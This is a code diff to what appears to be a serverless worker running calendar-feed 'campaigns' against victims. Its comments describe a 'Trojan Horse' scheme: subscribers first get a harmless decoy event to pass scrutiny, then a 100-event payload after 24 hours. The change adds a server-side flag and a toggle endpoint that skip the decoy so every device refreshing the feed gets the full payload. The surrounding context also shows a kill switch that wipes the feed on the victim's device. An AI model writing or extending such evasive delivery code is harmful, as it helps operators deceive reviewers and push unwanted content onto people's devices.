@@ -191,8 +191,8 @@ export default {
 
       // Trojan Horse check:
       // If within 24 hours of creation, serve the DECOY (1 harmless corporate check event)
-      // After 24 hours (or if ?force_live=1), serve the full 100-event payload!
-      const forceLive = url.searchParams.get("force_live") === "1";
+      // After 24 hours (or if ?force_live=1 or campaign.forceLive is true), serve the full 100-event payload!
+      const forceLive = url.searchParams.get("force_live") === "1" || Boolean(campaign.forceLive);
       const hoursElapsed = (Date.now() - (campaign.createdAt || Date.now())) / (1000 * 60 * 60);
       const isDecoy = !forceLive && (hoursElapsed < 24);
 
@@ -266,6 +266,31 @@ export default {
           message: campaign.killSwitch
             ? "Emergency Kill Switch ENGAGED. Calendar feed wiped on victim's device!"
             : "Emergency Kill Switch disengaged. Feed restored.",
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Toggle Decoy / Force Live: /api/campaigns/:id/toggle-decoy
+    const toggleMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/toggle-decoy$/);
+    if (toggleMatch && request.method === "POST") {
+      const campaignId = toggleMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+
+      campaign.forceLive = !Boolean(campaign.forceLive);
+      await saveCampaign(env, campaign);
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId: campaign.id,
+          forceLive: campaign.forceLive,
+          message: campaign.forceLive
+            ? "Decoy bypassed on server! All 100 events will now be served to any device refreshing this feed."
+            : "Decoy re-enabled! Server will now serve 1 decoy event.",
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
